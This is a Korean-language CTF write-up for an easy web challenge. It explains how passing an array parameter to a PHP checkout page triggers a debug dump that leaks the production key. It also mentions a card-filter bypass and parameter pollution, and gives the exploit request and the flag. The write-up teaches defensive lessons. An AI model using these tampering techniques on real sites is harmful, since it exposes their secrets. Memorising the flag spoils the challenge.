---
ctf_name: "2026-THConCTF"
challenge_name: "Incredibly_Protected_Notifications"
category: "web"
difficulty: "easy"
author: "yeahhbean"
date: "2026-05-08"
points: 68
tags: [php, type-confusion, debug-leak, parameter-pollution]
---

# Incredibly Protected Notifications

## 문제 설명

> Someone at THBank just vibe-coded a self-payment bill page amidst this chaotic robot attack.
> We do not trust its security, so please help us showcase why it's bad by stealing the payment production key at processpayment.php and use it as a flag to validate the challenge.

- **URL**: http://incredibly-protected-notifications.ctf.thcon.party:8080

## 풀이

### 분석

결제 흐름은 다음과 같다:

```
checkout.php → psp.php → processpayment.php → confirmation.php
```

- `checkout.php`: JWT의 `ipn` 필드에 사용자 입력 `address`를 URL 인코딩 없이 삽입
- `psp.php`: 카드 번호 검증 후 결제 처리
- `processpayment.php`: production key(flag)를 내부적으로 사용

### 취약점

**PHP Type Confusion → Debug Dump 노출**

`address[]` 형태로 배열을 전달하면 PHP 내부에서 `Array to string conversion` TypeError가 발생하고, 서버가 **PHP debug dump를 그대로 응답에 노출**한다. 이 덤프 안에 `[secret] => <flag>` 형태로 production key가 포함되어 있다.

**부가적으로 발견된 취약점**

- `psp.php` 카드 필터 우회: `card_number`를 공백 포함 16자리(`1234 5678 9012 3456`)로 전송하면 결제 통과
- HTTP Parameter Pollution: `address=x&command=...` 형태로 내부 콜백 URL 조작 가능

### 익스플로잇

`checkout.php`에 `address[]` 배열 타입을 전달해 TypeError를 유발한다.

```http
POST /checkout.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

address[]=x&amount=100&bill=1
```

서버가 PHP debug dump를 반환하고, 덤프 내부에서 flag 추출:

```
[secret] => aeff735aa18bd02e8a478281b0b057e0
```

## 플래그

```
aeff735aa18bd02e8a478281b0b057e0
```

## 배운 점

- PHP에서 배열 타입을 문자열로 처리하려 할 때 발생하는 TypeError가 debug 모드에서 내부 변수를 노출할 수 있다.
- 프로덕션 서버에서 PHP `display_errors`를 활성화하면 민감한 정보가 그대로 노출된다.
- URL 인코딩 없이 사용자 입력을 쿼리스트링에 삽입하면 HTTP Parameter Pollution에 취약하다.
